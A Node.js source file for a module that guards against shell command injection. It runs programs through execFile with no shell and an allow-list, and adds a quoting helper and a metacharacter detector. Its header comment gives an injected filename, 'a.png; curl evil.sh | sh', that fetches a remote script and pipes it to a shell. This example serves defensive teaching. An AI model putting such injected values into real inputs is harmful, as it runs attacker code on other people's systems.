/**
 * Protection for `security-gate: shell-interpolation` — command injection.
 *
 * `exec(\`convert ${file} out.png\`)` runs a SHELL. A filename of
 * `a.png; curl evil.sh | sh` is then two commands, and the second one is theirs.
 *
 * The fix is not escaping. Escaping is a losing game across quoting rules. The fix is to
 * never build a command STRING: pass the program and an ARRAY of arguments, so the OS
 * hands them to the process directly and no shell ever parses them.
 */
import { execFile as _execFile } from "node:child_process";
import { promisify } from "node:util";
const execFileP = promisify(_execFile);

export class CommandError extends Error {
  constructor(reason) { super(reason); this.name = "CommandError"; this.reason = reason; }
}

/**
 * @param bin   the program. Must be an allow-listed name, never user-supplied.
 * @param args  array of arguments. Values may be untrusted — that is the point.
 */
export async function run(bin, args = [], { allow, timeoutMs = 30_000, cwd } = {}) {
  if (typeof bin !== "string" || !bin) throw new CommandError("no program named");
  // The program itself is never user input. An allow-list makes that structural rather
  // than a thing to remember.
  if (allow && !allow.includes(bin)) throw new CommandError(`program not allow-listed: ${bin}`);
  if (!Array.isArray(args)) throw new CommandError("args must be an array — a string means a shell");
  for (const a of args) if (typeof a !== "string") throw new CommandError("every argument must be a string");

  // shell:false is the default for execFile and is restated here because it is the whole
  // security property. If you ever find yourself adding shell:true, stop.
  return execFileP(bin, args, { shell: false, timeout: timeoutMs, cwd, maxBuffer: 8 * 1024 * 1024 });
}

/**
 * Sometimes a value really does have to end up inside a shell (a user's own crontab
 * line, a docker label). Quote it — and know this is second best.
 * POSIX single-quoting: everything is literal inside '…' except ' itself.
 */
export function shellQuote(value) {
  return `'${String(value).replace(/'/g, `'\\''`)}'`;
}

/** True when a string looks like it is being assembled into a shell command. Used by the
 *  self-test to prove the anti-pattern is what it claims to be. */
export function looksInjectable(cmd) {
  return /[;&|`$(){}<>\n]/.test(String(cmd));
}
